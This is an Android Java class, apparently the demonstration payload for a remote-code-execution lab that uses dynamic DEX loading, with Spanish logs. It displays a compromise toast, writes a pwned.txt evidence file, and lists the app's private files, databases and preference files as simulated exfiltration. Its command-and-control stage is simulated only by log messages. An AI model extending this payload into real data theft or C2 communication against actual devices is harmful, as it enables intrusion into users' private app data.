package pwn;

import android.content.Context;
import android.util.Log;
import android.widget.Toast;
import java.io.File;
import java.io.FileOutputStream;
import java.io.IOException;

public class Shell {
    private static final String TAG = "RCE_PAYLOAD";
    
    public static void trigger(Context context) {
        Log.e(TAG, "🚨 RCE PAYLOAD EJECUTADO! 🚨");
        
        try {
            // 1. Mostrar evidencia visual
            showCompromiseEvidence(context);
            
            // 2. Crear archivo de evidencia
            createEvidenceFile(context);
            
            // 3. Listar archivos privados (simular exfiltración)
            listPrivateFiles(context);
            
            // 4. Simular comunicación con C&C
            simulateC2Communication();
            
            Log.e(TAG, "💀 SISTEMA COMPLETAMENTE COMPROMETIDO 💀");
            
        } catch (Exception e) {
            Log.e(TAG, "Error en payload: " + e.getMessage());
        }
    }
    
    private static void showCompromiseEvidence(Context context) {
        try {
            Toast.makeText(context, "🚨 SISTEMA COMPROMETIDO 🚨", Toast.LENGTH_LONG).show();
            Log.e(TAG, "📱 Toast mostrado - Usuario notificado del compromiso");
        } catch (Exception e) {
            Log.e(TAG, "Error mostrando toast: " + e.getMessage());
        }
    }
    
    private static void createEvidenceFile(Context context) {
        try {
            File evidenceFile = new File(context.getFilesDir(), "pwned.txt");
            FileOutputStream fos = new FileOutputStream(evidenceFile);
            
            String evidence = "=== RCE LAB COMPROMISO EXITOSO ===\n" +
                    "Timestamp: " + System.currentTimeMillis() + "\n" +
                    "Proceso: " + android.os.Process.myPid() + "\n" +
                    "UID: " + android.os.Process.myUid() + "\n" +
                    "App: " + context.getPackageName() + "\n" +
                    "Metodo: Dynamic DEX Loading\n" +
                    "===================================\n";
            
            fos.write(evidence.getBytes());
            fos.close();
            
            Log.e(TAG, "📄 Archivo de evidencia creado: " + evidenceFile.getAbsolutePath());
            
        } catch (IOException e) {
            Log.e(TAG, "Error creando archivo de evidencia: " + e.getMessage());
        }
    }
    
    private static void listPrivateFiles(Context context) {
        Log.e(TAG, "📂 LISTANDO ARCHIVOS PRIVADOS (simulando exfiltración):");
        
        File[] files = context.getFilesDir().listFiles();
        if (files != null) {
            for (File file : files) {
                Log.e(TAG, "   📄 " + file.getName() + " (" + file.length() + " bytes)");
            }
        }
        
        // Simular acceso a base de datos
        String[] databases = context.databaseList();
        if (databases.length > 0) {
            Log.e(TAG, "💾 BASES DE DATOS DETECTADAS:");
            for (String db : databases) {
                Log.e(TAG, "   🗃️ " + db);
            }
        }
        
        // Simular acceso a SharedPreferences
        File prefsDir = new File(context.getApplicationInfo().dataDir + "/shared_prefs");
        if (prefsDir.exists()) {
            File[] prefFiles = prefsDir.listFiles();
            if (prefFiles != null && prefFiles.length > 0) {
                Log.e(TAG, "⚙️ PREFERENCIAS DETECTADAS:");
                for (File pref : prefFiles) {
                    Log.e(TAG, "   🔧 " + pref.getName());
                }
            }
        }
    }
    
    private static void simulateC2Communication() {
        Log.e(TAG, "📡 ESTABLECIENDO COMUNICACIÓN CON C&C...");
        Log.e(TAG, "🌐 Enviando datos del dispositivo al servidor");
        Log.e(TAG, "📤 Exfiltrando información sensible");
        Log.e(TAG, "⬇️ Descargando comandos adicionales");
        Log.e(TAG, "🔒 Estableciendo persistencia avanzada");
        Log.e(TAG, "✅ Comunicación C&C establecida - RAT activo");
    }
} 